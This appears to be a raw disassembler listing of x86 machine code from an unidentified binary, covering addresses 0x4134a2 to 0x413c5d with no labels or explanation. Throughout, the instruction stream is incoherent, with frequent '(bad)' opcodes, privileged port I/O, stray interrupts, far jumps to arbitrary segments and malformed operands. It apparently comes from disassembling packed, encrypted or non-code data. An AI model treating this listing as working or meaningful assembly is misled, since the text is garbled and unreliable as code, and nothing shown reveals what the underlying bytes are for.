  4134a2:	xor    ah,BYTE PTR [eax+0x537ec4dd]
  4134a8:	jb     0x413526
  4134aa:	mov    ds:0xcd750c2e,al
  4134af:	jbe    0x4134bb
  4134b1:	inc    eax
  4134b2:	add    al,al
  4134b4:	stos   DWORD PTR es:[edi],eax
  4134b5:	mov    esi,ebx
  4134b7:	adc    al,0x1d
  4134b9:	jmp    0x41346d
  4134bb:	icebp  
  4134bc:	les    esp,FWORD PTR [ebx+0x23]
  4134bf:	(bad)  
  4134c1:	loop   0x4134d9
  4134c3:	push   ds
  4134c4:	xor    eax,0xa116e1e5
  4134c9:	sbb    eax,0x37ea88f
  4134ce:	add    ebp,DWORD PTR [ecx]
  4134d0:	adc    eax,0xf3a41b0e
  4134d5:	lods   al,BYTE PTR ds:[esi]
  4134d6:	inc    edx
  4134d7:	jb     0x413488
  4134d9:	push   esp
  4134da:	cs ror ebx,0xa1
  4134de:	inc    ebx
  4134df:	mov    dh,0xdd
  4134e1:	mov    BYTE PTR [edi],dh
  4134e3:	test   BYTE PTR [ebx+0x77],bl
  4134e6:	add    edx,DWORD PTR [ebp+ebp*2-0x32]
  4134ea:	call   0x4d0c7902
  4134ef:	adc    ebp,DWORD PTR [ebx-0x2d]
  4134f2:	adc    ch,ah
  4134f4:	push   esp
  4134f5:	das    
  4134f6:	ret    
  4134f7:	pop    ss
  4134f8:	sbb    DWORD PTR [ebx-0x78],ecx
  4134fb:	pop    es
  4134fc:	xchg   edx,eax
  4134fd:	lods   eax,DWORD PTR ds:[esi]
  4134ff:	mov    eax,ds:0x37c9dcee
  413504:	add    al,0x5e
  413506:	sub    BYTE PTR [ebx+0x407dadbb],dh
  41350c:	jno    0x41353b
  41350e:	ins    DWORD PTR es:[edi],dx
  41350f:	and    cl,cl
  413511:	mov    DWORD PTR [esi],ebx
  413513:	sbb    al,0x6f
  413515:	pop    eax
  413516:	stc    
  413517:	and    eax,0x61d06e9d
  41351c:	dec    esp
  41351d:	mov    ah,0x55
  41351f:	cdq    
  413520:	cmpxchg8b QWORD PTR [edi]
  413523:	arpl   ax,sp
  413525:	sti    
  413526:	xchg   esp,eax
  413527:	inc    esi
  413528:	gs xor ebx,esi
  41352b:	fwait
  41352c:	mov    cl,0x89
  41352e:	bound  ebp,QWORD PTR [ebx+0x5c]
  413531:	sbb    BYTE PTR [edx+0x35],0x5c
  413535:	fild   DWORD PTR [edx+ecx*2-0x451adcea]
  41353c:	(bad)  
  41353d:	sbb    al,bl
  41353f:	jg     0x4135af
  413541:	int    0xb1
  413543:	repnz push eax
  413545:	sbb    ah,BYTE PTR es:[ecx-0x67]
  413549:	or     eax,0x23e8731b
  41354e:	add    eax,0xeb32c664
  413553:	xchg   ebp,eax
  413554:	add    BYTE PTR [ebp+0x7d],dl
  413557:	not    DWORD PTR [ecx]
  413559:	or     eax,0xb3af7415
  41355e:	pop    esp
  41355f:	fs xor edi,edx
  413562:	fdiv   st(0),st
  413564:	dec    edx
  413565:	shl    edi,0xc2
  413568:	mov    edi,DWORD PTR [eax+0x10e43816]
  41356e:	xor    edi,esi
  413570:	loope  0x4135a6
  413572:	mov    ch,0x87
  413574:	in     eax,dx
  413575:	pusha  
  413576:	xchg   ebp,eax
  413577:	sub    BYTE PTR [ecx-0x2c],bl
  41357a:	jbe    0x4135db
  41357c:	(bad)  
  41357d:	aam    0x2b
  41357f:	push   0x54
  413581:	pop    edi
  413582:	cmp    ecx,DWORD PTR [edi+0x2b]
  413585:	mov    esp,0xc6ce1649
  41358a:	mov    eax,ds:0x48c41f55
  41358f:	and    al,BYTE PTR [edi+0x7f]
  413592:	loope  0x413535
  413594:	mov    DWORD PTR [ebx+ebx*4],esi
  413597:	cmp    ebp,DWORD PTR [ebp+0x2ddb55b7]
  41359d:	push   es
  41359e:	cdq    
  41359f:	pop    ds
  4135a0:	sbb    eax,0x36f1c2e1
  4135a5:	es push ebx
  4135a7:	pop    DWORD PTR [eax]
  4135a9:	xchg   DWORD PTR [ecx+edx*8],eax
  4135ac:	cmc    
  4135ad:	div    DWORD PTR [edi+0x156a50a2]
  4135b3:	xor    al,0xc5
  4135b5:	stos   DWORD PTR es:[edi],eax
  4135b6:	mov    bh,al
  4135b8:	cmp    eax,0xe4af2f6b
  4135bd:	and    edx,ebx
  4135bf:	mov    bh,0xec
  4135c1:	test   eax,0x8fa85b60
  4135c6:	pop    ebp
  4135c7:	jecxz  0x413642
  4135c9:	xchg   ebx,eax
  4135ca:	cmp    esi,DWORD PTR [ebx+0x1281a702]
  4135d0:	xchg   BYTE PTR [ecx-0x10],dl
  4135d3:	cld    
  4135d4:	xchg   esi,eax
  4135d5:	cmp    edi,eax
  4135d7:	pusha  
  4135d8:	and    al,0x3
  4135db:	rol    bh,1
  4135dd:	adc    al,0x14
  4135df:	xchg   BYTE PTR [edx+0x2cefe4ef],bh
  4135e5:	pop    edi
  4135e6:	dec    esp
  4135e7:	mov    edi,0x7276519e
  4135ec:	pop    ecx
  4135ed:	jmp    0x3e0a:0xb0d8f717
  4135f4:	aaa    
  4135f5:	pop    esi
  4135f6:	adc    ebx,edx
  4135f8:	cmp    BYTE PTR [ebx],ah
  4135fa:	jo     0x413676
  4135fc:	mov    bl,BYTE PTR [esi-0x14]
  4135ff:	push   esi
  413600:	add    ebx,DWORD PTR [edi]
  413602:	dec    ebx
  413603:	popa   
  413604:	out    0xff,al
  413606:	or     esi,DWORD PTR [ebx-0x4f0223ba]
  41360c:	push   esp
  41360d:	jg     0x41359d
  41360f:	xor    ch,BYTE PTR [eax]
  413611:	mov    esp,DWORD PTR [edx+0x163b7085]
  413617:	popa   
  413618:	dec    ecx
  413619:	push   ebx
  41361a:	inc    esi
  41361b:	push   cs
  41361c:	pand   mm1,QWORD PTR [esi]
  41361f:	jo     0x41364e
  413621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413622:	sub    BYTE PTR [edx],0x35
  413625:	sbb    bl,dh
  413627:	mov    DWORD PTR [ecx],esp
  413629:	jnp    0x41364f
  41362b:	or     esi,DWORD PTR [edx-0x371dd2ea]
  413631:	enter  0x1fa,0xcb
  413635:	dec    ecx
  413636:	pop    ds
  413637:	mov    cl,0x30
  413639:	jae    0x413630
  41363b:	and    dl,BYTE PTR [ecx+0x4f]
  41363e:	sar    ebx,1
  413640:	mov    ah,BYTE PTR [eax]
  413642:	dec    esp
  413643:	fcomi  st,st(4)
  413645:	inc    esp
  413646:	out    0xaa,eax
  413648:	shl    BYTE PTR [ebp-0x44b87232],cl
  41364e:	xchg   esp,eax
  41364f:	adc    edi,esi
  413651:	(bad)  
  413652:	jo     0x41364e
  413654:	in     al,dx
  413655:	push   ebp
  413656:	mov    al,0xeb
  413658:	and    eax,0x2abd04b7
  41365d:	mov    cl,0x8c
  41365f:	test   BYTE PTR [edi+0x6f],dh
  413662:	mov    WORD PTR [ebx],gs
  413664:	mov    eax,0x75071b30
  413669:	sub    bh,BYTE PTR [eax+0x3f]
  41366c:	mov    BYTE PTR [edx],ch
  41366e:	test   al,0x61
  413670:	int3   
  413671:	sbb    eax,0xd90028e8
  413676:	sub    edi,DWORD PTR [edx+0x2c]
  413679:	das    
  41367a:	sbb    DWORD PTR [esp+eiz*8+0x42],0x37f24a05
  413682:	jnp    0x413680
  413684:	push   ebp
  413685:	sbb    DWORD PTR [ebx-0x22917e2],esp
  41368b:	jo     0x413610
  41368d:	push   fs
  41368f:	call   0xc665:0x151bc7e6
  413696:	mov    esp,0x9ed2bb0b
  41369b:	into   
  41369c:	mov    esp,0x6500b5e7
  4136a1:	pop    ecx
  4136a2:	or     al,0x13
  4136a4:	test   BYTE PTR [esi+0x74138e10],cl
  4136aa:	stos   BYTE PTR es:[edi],al
  4136ab:	lock gs or edi,ecx
  4136af:	add    ecx,esp
  4136b1:	enter  0xad56,0x8e
  4136b5:	xchg   ebx,eax
  4136b6:	in     al,0x62
  4136b8:	dec    ecx
  4136b9:	jb     0x413680
  4136bb:	dec    ecx
  4136bc:	add    eax,0xb2c4e567
  4136c1:	push   0xffffff90
  4136c3:	not    ch
  4136c5:	in     eax,0x97
  4136c7:	jmp    0x916f25fd
  4136cc:	lds    edi,FWORD PTR [edx-0x64]
  4136cf:	bound  esi,QWORD PTR [ebx+0x28]
  4136d2:	sti    
  4136d3:	lds    esp,FWORD PTR ds:0x348439c8
  4136d9:	mov    al,ds:0xc18fb898
  4136de:	and    BYTE PTR [ebp+0x529a2e0f],0x3e
  4136e5:	dec    ebx
  4136e6:	mov    bl,0x15
  4136e8:	jne    0x4136b2
  4136ea:	jb     0x413767
  4136ec:	idiv   DWORD PTR [ebx+0x290fef11]
  4136f2:	mov    ch,0xe5
  4136f4:	mov    bh,0xdc
  4136f6:	mov    ebx,0xb8e41300
  4136fb:	push   ss
  4136fc:	lods   eax,DWORD PTR ds:[esi]
  4136fd:	push   ecx
  4136fe:	in     eax,dx
  4136ff:	stos   DWORD PTR es:[edi],eax
  413700:	inc    ebp
  413701:	add    ebp,DWORD PTR [ebx+0x4e]
  413704:	outs   dx,BYTE PTR ds:[esi]
  413705:	fisubr DWORD PTR [esi-0x1f]
  413708:	sub    BYTE PTR ds:0xb6f6527a,bl
  41370e:	pop    edx
  41370f:	das    
  413710:	sbb    eax,0xd3aa0967
  413715:	cld    
  413716:	sbb    DWORD PTR [esi-0x3e9dd70c],esi
  41371c:	xor    al,0xfb
  41371e:	xchg   esi,eax
  41371f:	imul   ecx,DWORD PTR [edx],0xeb3b6de5
  413725:	xchg   ecx,edi
  413727:	into   
  413728:	mov    al,0x35
  41372a:	sbb    dh,al
  41372c:	and    al,0xca
  41372e:	shr    ecx,cl
  413730:	mov    esi,0x8579e4d
  413735:	fsubrp st(2),st
  413737:	inc    ebx
  413738:	rcl    BYTE PTR [eax],cl
  41373a:	mov    bl,0xf9
  41373c:	nop
  41373d:	xor    bh,dl
  41373f:	mov    edi,0x3e753815
  413744:	pop    ecx
  413745:	pop    edi
  413746:	les    edx,FWORD PTR [edx-0x370a1f83]
  41374c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41374d:	inc    ecx
  41374e:	fldenv [esi-0x3]
  413751:	mov    dh,0x9e
  413753:	mov    ch,0xee
  413755:	test   al,0xc0
  413757:	nop
  413758:	inc    ebx
  413759:	lds    esp,FWORD PTR [edx]
  41375b:	mov    eax,ds:0x327f791d
  413760:	test   DWORD PTR [eax],eax
  413762:	neg    BYTE PTR [ecx+0x5c714a46]
  413768:	jb     0x4136f9
  41376a:	mov    ecx,0x173dda8b
  41376f:	lahf   
  413770:	jle    0x4136fa
  413772:	xchg   ebx,eax
  413773:	mov    bl,0x3
  413775:	xchg   ebx,eax
  413776:	mov    ds:0x2010d44b,al
  41377b:	ja     0x413701
  41377d:	adc    BYTE PTR [esi-0x4c5fc37d],cl
  413783:	jecxz  0x413797
  413785:	or     ebp,ecx
  413787:	ins    DWORD PTR es:[edi],dx
  413788:	popf   
  413789:	mov    eax,0x79cee39e
  41378e:	out    0xf8,eax
  413790:	sahf   
  413791:	dec    esp
  413792:	(bad)
  413795:	dec    esp
  413796:	cmc    
  413797:	pop    eax
  413798:	sbb    dl,BYTE PTR [edi+0x604e903a]
  41379e:	adc    eax,0x403327c7
  4137a3:	lods   al,BYTE PTR ds:[esi]
  4137a4:	sbb    dl,BYTE PTR [ebx-0x79]
  4137a7:	ds jl  0x4137ce
  4137aa:	mov    ds:0x7c0ab0f9,eax
  4137af:	popa   
  4137b0:	xor    DWORD PTR [eax],esi
  4137b2:	push   ss
  4137b3:	or     edx,ecx
  4137b5:	adc    ebx,DWORD PTR [eax-0x1b]
  4137b8:	push   edx
  4137b9:	int    0x9e
  4137bb:	imul   esp,DWORD PTR [ebx-0x72cc9aad],0x2c
  4137c2:	pusha  
  4137c3:	pop    ss
  4137c4:	(bad)  
  4137c5:	mov    eax,ds:0xd36c7f12
  4137ca:	push   eax
  4137cb:	pop    ds
  4137cc:	iret   
  4137cd:	sub    DWORD PTR [esi+0x4b0a5756],edi
  4137d3:	or     edx,DWORD PTR [esi+edi*8+0x24c302c]
  4137da:	mov    bl,0xf6
  4137dc:	cld    
  4137dd:	push   ebp
  4137de:	mov    al,ds:0x1c353853
  4137e3:	jnp    0x4137d1
  4137e5:	jo     0x4137a3
  4137e7:	xchg   esi,eax
  4137e8:	(bad)  
  4137e9:	call   0xe5ef4391
  4137ee:	mov    edi,0xa6017b50
  4137f3:	leave  
  4137f4:	sub    BYTE PTR [ecx],0xae
  4137f7:	cmc    
  4137f8:	test   BYTE PTR [ebx+ecx*4],bh
  4137fb:	dec    ecx
  4137fc:	(bad)  
  4137fd:	pop    esp
  4137fe:	cmp    ah,BYTE PTR [edi]
  413800:	out    dx,al
  413801:	sar    BYTE PTR [eax],cl
  413803:	ror    ebp,cl
  413805:	loopne 0x4137e1
  413807:	popa   
  413808:	sbb    DWORD PTR [ebx],ecx
  41380a:	xor    BYTE PTR [ecx-0x61],0x49
  41380e:	mov    ds:0x254e50b6,eax
  413813:	cwde   
  413814:	mov    al,ds:0x2d2b1a80
  413819:	sub    edi,edx
  41381b:	inc    ecx
  41381c:	adc    edi,ecx
  41381e:	jl     0x41380d
  413820:	xchg   ecx,eax
  413821:	mov    bh,cl
  413823:	lea    esp,[ebx]
  413825:	mov    ebp,?
  413827:	fs leave 
  413829:	push   edx
  41382a:	enter  0x561e,0x99
  41382e:	inc    edx
  41382f:	xchg   ebx,eax
  413830:	mov    esi,DWORD PTR [eax+0x25]
  413833:	adc    edx,DWORD PTR [ebx]
  413835:	int    0x20
  413837:	inc    esi
  413838:	popf   
  413839:	jg     0x41384b
  41383b:	mov    bl,0xdb
  41383d:	je     0x413817
  41383f:	shl    DWORD PTR [ebx+eiz*1],1
  413842:	dec    ebp
  413843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413844:	xrelease mov BYTE PTR [ecx+0x23107e13],cl
  41384b:	in     eax,dx
  41384c:	xor    BYTE PTR [ecx+0x626078a6],bl
  413852:	(bad)  
  413854:	fcomip st,st(6)
  413856:	jmp    0xa50b:0x90183399
  41385d:	mov    eax,0x2b040cf0
  413862:	(bad)  
  413863:	mov    esi,0xc5d7399c
  413868:	mov    bl,0xee
  41386a:	push   0xffffffe1
  41386c:	fld    TBYTE PTR [edx+0x25]
  41386f:	(bad)  
  413870:	push   ecx
  413871:	inc    ebp
  413872:	lock xor eax,0xc05ace01
  413878:	mov    ebp,0x8eb2f514
  41387d:	out    dx,eax
  41387e:	and    al,0x79
  413880:	mov    es:0xc0e63aea,eax
  413886:	addr16 cdq 
  413888:	or     BYTE PTR [edi],0x86
  41388b:	or     bl,ch
  41388d:	lahf   
  41388e:	xchg   edi,eax
  41388f:	aad    0xa7
  413891:	or     BYTE PTR [edi+0x55],dl
  413894:	inc    eax
  413895:	fisub  WORD PTR [ecx-0x7a]
  413898:	inc    edi
  413899:	mov    edx,0xb95ae2be
  41389e:	inc    esp
  41389f:	dec    esi
  4138a0:	imul   edx,DWORD PTR [edx],0x6a
  4138a3:	lahf   
  4138a4:	sbb    eax,0xbc580c2e
  4138a9:	fs pop ebp
  4138ab:	nop
  4138ac:	in     al,dx
  4138ad:	sahf   
  4138ae:	in     eax,0x95
  4138b0:	fisubr WORD PTR [esp+edx*2]
  4138b3:	adc    DWORD PTR [eax],0x55565610
  4138b9:	inc    ebp
  4138ba:	ja     0x4138a5
  4138bc:	jecxz  0x4138ac
  4138be:	fcmove st,st(6)
  4138c0:	cs pop esi
  4138c2:	inc    si
  4138c4:	sub    dh,cl
  4138c6:	cs push ebx
  4138c8:	fisub  DWORD PTR [ebx]
  4138ca:	adc    BYTE PTR fs:[ecx+0xa],ah
  4138ce:	jbe    0x41392c
  4138d0:	js     0x413889
  4138d2:	adc    BYTE PTR [edi-0x10],dl
  4138d5:	push   ds
  4138d6:	addr16 adc al,0x99
  4138d9:	inc    esp
  4138da:	iret   
  4138db:	mov    ah,0x5b
  4138dd:	inc    esi
  4138de:	int    0x6b
  4138e0:	es fwait
  4138e2:	sub    DWORD PTR [eax+0x71b06c8f],ebx
  4138e8:	jle    0x41395b
  4138ea:	xor    edx,DWORD PTR [edi+ecx*2]
  4138ed:	shl    BYTE PTR [eax-0xf],cl
  4138f0:	stos   DWORD PTR es:[edi],eax
  4138f1:	jbe    0x413902
  4138f3:	leave  
  4138f4:	aaa    
  4138f5:	cmp    BYTE PTR [eax+0x2f8a94aa],0x43
  4138fc:	push   0x15cc7f10
  413901:	scas   eax,DWORD PTR es:[edi]
  413902:	mov    WORD PTR [eax+0x7],gs
  413905:	and    BYTE PTR [edi+0x15543d16],ch
  41390b:	mov    al,ds:0x185da4db
  413910:	pushf  
  413911:	mov    edi,0xe50d25a5
  413916:	ins    DWORD PTR es:[edi],dx
  413917:	mov    al,ds:0x474f93cf
  41391c:	cmc    
  41391d:	xor    al,0xd3
  41391f:	clc    
  413920:	cld    
  413921:	sahf   
  413922:	cwde   
  413923:	and    edi,DWORD PTR [ebp-0x44]
  413926:	out    0xbe,eax
  413928:	push   0xffffffe5
  41392a:	int    0x6f
  41392c:	je     0x41393d
  41392e:	mov    ss,WORD PTR [ebp+ebp*4-0x705014a1]
  413935:	pop    es
  413936:	out    0xd1,al
  413938:	xor    eax,0x5e6ddaec
  41393d:	jmp    0x419c:0x2635224
  413944:	cwde   
  413945:	gs ss int3 
  413948:	out    0x6c,al
  41394a:	in     eax,0xc9
  41394c:	push   es
  41394d:	dec    eax
  41394e:	sub    ecx,DWORD PTR [edi+0x14bce217]
  413954:	jbe    0x41391c
  413956:	rcr    DWORD PTR [edi],1
  413958:	jge    0x41395b
  41395a:	addr16 push esp
  41395c:	mov    dl,0x7c
  41395e:	or     DWORD PTR [ebx-0x5e],ebx
  413961:	pop    edi
  413962:	push   edi
  413963:	mov    bh,0x4d
  413965:	aam    0xb2
  413967:	jge    0x4139cf
  413969:	cmp    eax,esp
  41396b:	pop    esi
  41396c:	leave  
  41396d:	xlat   BYTE PTR ds:[ebx]
  41396e:	sbb    DWORD PTR [edx],ecx
  413970:	jbe    0x41394a
  413972:	or     BYTE PTR [ebx+0x6c],ah
  413975:	fs lahf 
  413977:	fimul  WORD PTR [ebp-0x32]
  41397a:	mov    ds:0xabc68fbb,eax
  41397f:	or     al,0x78
  413981:	int3   
  413982:	mov    esp,0x86650cf8
  413987:	xor    al,0x59
  413989:	cmp    bl,bh
  41398b:	fsub   DWORD PTR [eax-0x3f42ff82]
  413991:	inc    esi
  413992:	dec    ebx
  413993:	cmp    edi,DWORD PTR [ecx]
  413995:	(bad)  
  413996:	clc    
  413997:	ret    0x302e
  41399a:	mov    ds:0x74004fc7,eax
  41399f:	jo     0x413948
  4139a1:	or     al,dh
  4139a3:	in     al,0xa0
  4139a5:	mov    edi,0xc24ccebc
  4139aa:	xor    dh,BYTE PTR [edx+ebx*1+0x37]
  4139ae:	loope  0x41396c
  4139b0:	sbb    edi,0x7bafb351
  4139b6:	imul   esi,edx,0xffffffb4
  4139b9:	cmp    dh,BYTE PTR [eax-0x29790199]
  4139bf:	inc    ebp
  4139c0:	inc    DWORD PTR [edi]
  4139c2:	in     eax,dx
  4139c3:	cld    
  4139c4:	cli    
  4139c5:	shl    BYTE PTR [ebp+0x3a],1
  4139c8:	fcmovnbe st,st(7)
  4139ca:	adc    ebp,DWORD PTR [edi+edi*1-0x12]
  4139ce:	sar    BYTE PTR [esi+0x2],1
  4139d1:	scas   eax,DWORD PTR es:[edi]
  4139d2:	lds    ecx,FWORD PTR [ebx-0x52]
  4139d5:	in     al,0x3e
  4139d7:	div    BYTE PTR [ebx+0x695d45c7]
  4139dd:	jecxz  0x4139b3
  4139df:	pop    eax
  4139e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139e1:	pop    es
  4139e2:	xor    al,0xb9
  4139e4:	adc    al,0xfb
  4139e6:	sub    eax,DWORD PTR [esi-0x59]
  4139e9:	mov    dl,0x9d
  4139eb:	mov    ch,0xed
  4139ed:	scas   eax,DWORD PTR es:[edi]
  4139ee:	call   0xf834:0xf1cc9e83
  4139f5:	dec    edx
  4139f6:	(bad)  
  4139f7:	aad    0xda
  4139f9:	popa   
  4139fa:	out    dx,eax
  4139fb:	or     BYTE PTR [esi-0x1c5ddbd9],0x7e
  413a02:	mov    ?,WORD PTR [esi]
  413a04:	stc    
  413a05:	mov    esi,DWORD PTR [ebx+0x23e8b6f5]
  413a0b:	jmp    0xe44d:0x1c7d7451
  413a12:	inc    ecx
  413a13:	or     al,0xa3
  413a15:	mov    ebx,0xe3e3b396
  413a1a:	mov    bl,0x85
  413a1c:	ja     0x413a48
  413a1e:	inc    ebx
  413a1f:	mov    ah,0xa1
  413a21:	aas    
  413a22:	aas    
  413a23:	mov    eax,DWORD PTR [ebx+esi*4-0x541afa9]
  413a2a:	xchg   ecx,eax
  413a2b:	lds    edx,FWORD PTR [eax]
  413a2d:	adc    BYTE PTR [ebx+eax*2-0x1b137384],dl
  413a34:	mov    esi,0x87fae52c
  413a39:	mov    al,ds:0x3ca3f664
  413a3e:	or     cl,ah
  413a40:	ficomp DWORD PTR [ebx-0x6c]
  413a43:	stc    
  413a44:	lock push ebx
  413a46:	cmp    al,0xc5
  413a48:	push   0x4e90aece
  413a4d:	jmp    0x4139d5
  413a4f:	fdivr  QWORD PTR [ebx+ecx*2-0x69]
  413a53:	xlat   BYTE PTR ds:[ebx]
  413a54:	fcmovb st,st(7)
  413a56:	sub    esp,ecx
  413a58:	fcomp  DWORD PTR [eax+0x4ae5e301]
  413a5e:	jmp    DWORD PTR [eax+0x1c79258c]
  413a64:	imul   ecx,DWORD PTR [esi],0x14
  413a67:	repnz int3 
  413a69:	adc    BYTE PTR [edx],cl
  413a6b:	cmp    al,0x53
  413a6d:	mov    edx,0x66b3dedd
  413a72:	pop    es
  413a73:	jne    0x413a7d
  413a75:	sub    eax,0x10c525e
  413a7a:	outs   dx,DWORD PTR ds:[esi]
  413a7b:	jp     0x413a49
  413a7d:	jnp    0x413a73
  413a7f:	dec    ebx
  413a80:	mov    dh,0xac
  413a82:	xor    DWORD PTR [ecx],edi
  413a84:	jg     0x413a29
  413a86:	stos   BYTE PTR es:[edi],al
  413a87:	dec    esi
  413a88:	jae    0x413a0f
  413a8a:	outs   dx,BYTE PTR ds:[esi]
  413a8b:	xor    ah,bl
  413a8d:	mov    cl,0x10
  413a8f:	out    dx,al
  413a90:	test   al,0x21
  413a92:	jecxz  0x413a22
  413a94:	inc    ebx
  413a95:	jno    0x413b0c
  413a97:	iret   
  413a98:	pop    ecx
  413a99:	cmovne ecx,edi
  413a9c:	(bad)
  413aa0:	xchg   DWORD PTR [ebx+0x19326607],edx
  413aa6:	or     al,dl
  413aa8:	stos   DWORD PTR es:[edi],eax
  413aa9:	inc    eax
  413aaa:	and    eax,0x93fdbcbd
  413aaf:	lahf   
  413ab0:	and    BYTE PTR [edi+esi*8],0x79
  413ab4:	push   esp
  413ab5:	js     0x413ae0
  413ab7:	shl    DWORD PTR [ebp-0x36a95a05],cl
  413abd:	inc    edx
  413abe:	dec    esp
  413abf:	jle    0x413b13
  413ac1:	mov    ch,0x72
  413ac3:	xor    al,0x3d
  413ac5:	fstp   DWORD PTR [edx-0x4e70f54f]
  413acb:	xchg   ecx,eax
  413acc:	arpl   sp,dx
  413ace:	adc    eax,0xce66e657
  413ad3:	push   edx
  413ad4:	lea    ebx,[edi+0x2c]
  413ad7:	and    ebp,esi
  413ad9:	pop    ebx
  413ada:	shr    eax,0xf7
  413add:	or     al,0xf0
  413adf:	jnp    0x413ad0
  413ae1:	adc    eax,0x8a908abb
  413ae6:	push   ebp
  413ae7:	loop   0x413b37
  413ae9:	adc    ah,BYTE PTR [edi]
  413aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aec:	jno    0x413b66
  413aee:	sub    al,0x5f
  413af0:	das    
  413af1:	xchg   ebx,eax
  413af2:	or     ch,BYTE PTR [edi]
  413af4:	loope  0x413ab3
  413af6:	jp     0x413b76
  413af8:	gs sub ebx,esi
  413afb:	mov    ecx,0x6dd82c7f
  413b00:	mov    WORD PTR [edi+0x39],gs
  413b03:	idiv   DWORD PTR ds:[edi]
  413b06:	outs   dx,DWORD PTR ds:[esi]
  413b07:	mov    ebp,0x76b19dfd
  413b0c:	retf   0xcbc9
  413b0f:	repz mov edx,0x85cc516d
  413b15:	jp     0x413b61
  413b17:	add    ch,cl
  413b19:	aaa    
  413b1a:	pop    esi
  413b1b:	xchg   ecx,eax
  413b1c:	mov    BYTE PTR [ebp+0x686eca07],dh
  413b22:	and    eax,0x4cd4ad6a
  413b27:	addr16 out dx,al
  413b29:	or     bl,BYTE PTR [ecx-0x48fd1ab8]
  413b2f:	xchg   edi,eax
  413b30:	(bad)  
  413b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b32:	pop    eax
  413b33:	daa    
  413b34:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  413b36:	stc    
  413b37:	int3   
  413b38:	cmp    DWORD PTR [esi],ebp
  413b3a:	imul   ecx,DWORD PTR [esi],0x9ffd030e
  413b40:	sbb    dl,BYTE PTR [edx-0xd45562f]
  413b46:	shr    BYTE PTR [ecx-0x2a],cl
  413b49:	jge    0x413b3a
  413b4b:	push   esp
  413b4c:	mov    esp,DWORD PTR [eax]
  413b4e:	jae    0x413bad
  413b50:	and    BYTE PTR [esi-0x24],al
  413b53:	pop    esp
  413b54:	sbb    edx,edi
  413b56:	(bad)  
  413b58:	add    al,0x7
  413b5a:	leave  
  413b5b:	ja     0x413b9e
  413b5d:	add    al,0x7d
  413b5f:	adc    eax,0x47b6dbbe
  413b64:	nop
  413b65:	lds    ecx,FWORD PTR [eax]
  413b67:	dec    ebp
  413b68:	jle    0x413bb1
  413b6a:	add    al,0x5b
  413b6c:	aas    
  413b6d:	ret    
  413b6e:	sub    BYTE PTR [ebx+ecx*4],0x19
  413b72:	lea    ecx,[edi]
  413b74:	push   ss
  413b75:	cwde   
  413b76:	adc    eax,DWORD PTR [ebx]
  413b78:	sub    DWORD PTR [ebp-0x3abcb915],0x2bcb0396
  413b82:	fild   DWORD PTR [edx+eax*1]
  413b85:	pop    eax
  413b86:	adc    BYTE PTR [ecx+0xa458aa7],0xbe
  413b8d:	inc    esp
  413b8e:	cmp    ebx,0xffffffdd
  413b91:	push   edx
  413b92:	adc    al,0xbc
  413b94:	and    DWORD PTR [eax+0x1d59c2bd],edi
  413b9a:	mov    al,0xf1
  413b9c:	dec    eax
  413b9d:	imul   esp,DWORD PTR [ebx-0x44ad2d5f],0x56027de9
  413ba7:	push   edx
  413ba8:	xor    BYTE PTR [edi-0x64],0x41
  413bac:	push   ebx
  413bad:	xchg   esp,eax
  413bae:	aad    0x57
  413bb0:	ja     0x413bc8
  413bb2:	mov    ebx,0x2b9f33e5
  413bb7:	das    
  413bb8:	xchg   ebp,eax
  413bb9:	jecxz  0x413ba7
  413bbb:	dec    ecx
  413bbc:	mov    ds:0xb365ee53,eax
  413bc1:	adc    edi,DWORD PTR [ebx]
  413bc3:	out    0x64,eax
  413bc5:	mov    ecx,0xe5367ea5
  413bca:	test   al,0x97
  413bcc:	push   esi
  413bcd:	pop    eax
  413bce:	ds push cs
  413bd0:	push   esi
  413bd1:	mov    eax,0x946373fb
  413bd6:	push   ebp
  413bd7:	loope  0x413bf3
  413bd9:	push   eax
  413bda:	lods   al,BYTE PTR gs:[esi]
  413bdc:	pop    ecx
  413bdd:	daa    
  413bde:	xor    cl,ch
  413be0:	sbb    DWORD PTR [ebp+eiz*4-0xb],ebp
  413be4:	pop    esi
  413be5:	inc    ebx
  413be6:	xlat   BYTE PTR ds:[ebx]
  413be7:	rcl    esp,0x38
  413bea:	pop    ebp
  413beb:	xchg   ecx,eax
  413bec:	adc    ah,BYTE PTR [ebx+eax*4]
  413bef:	pop    ecx
  413bf0:	test   eax,0xfd1752a3
  413bf5:	popa   
  413bf6:	mov    edx,0x2926032a
  413bfb:	adc    eax,0x83f4053e
  413c00:	mov    BYTE PTR [eax],cl
  413c02:	shl    BYTE PTR [ebx],cl
  413c04:	lds    ebx,FWORD PTR [edx-0xccb0491]
  413c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c0b:	ret    0xeb93
  413c0e:	mov    eax,ds:0x6932dedf
  413c13:	aaa    
  413c14:	aaa    
  413c15:	sbb    DWORD PTR [esi+0x695cebef],edx
  413c1b:	je     0x413c8d
  413c1d:	mov    bh,0xb5
  413c1f:	sahf   
  413c20:	hlt    
  413c21:	jne    0x413c60
  413c23:	fbstp  TBYTE PTR [ebx+0x5d]
  413c26:	test   ecx,ebx
  413c28:	cs pop ss
  413c2a:	outs   dx,BYTE PTR ds:[esi]
  413c2b:	push   0xffffffa2
  413c2d:	(bad)  
  413c2e:	(bad)  
  413c2f:	xchg   edx,eax
  413c30:	call   0x7e29:0x29ff6d6
  413c37:	mov    ebp,0x79c4ff29
  413c3c:	dec    eax
  413c3d:	mov    ch,0xf0
  413c3f:	loope  0x413caa
  413c41:	je     0x413c8f
  413c43:	fs adc bh,ch
  413c46:	dec    edx
  413c47:	inc    edi
  413c48:	ret    
  413c49:	push   cs
  413c4a:	cwde   
  413c4b:	fist   WORD PTR [edx-0x73]
  413c4e:	pushf  
  413c4f:	push   0x69
  413c51:	gs sub al,0xc1
  413c54:	clc    
  413c55:	pop    ebp
  413c56:	(bad)  
  413c57:	stos   BYTE PTR es:[edi],al
  413c58:	bound  edx,QWORD PTR [ebx-0x67]
  413c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c5c:	scas   al,BYTE PTR es:[edi]
  413c5d:	es inc ebp
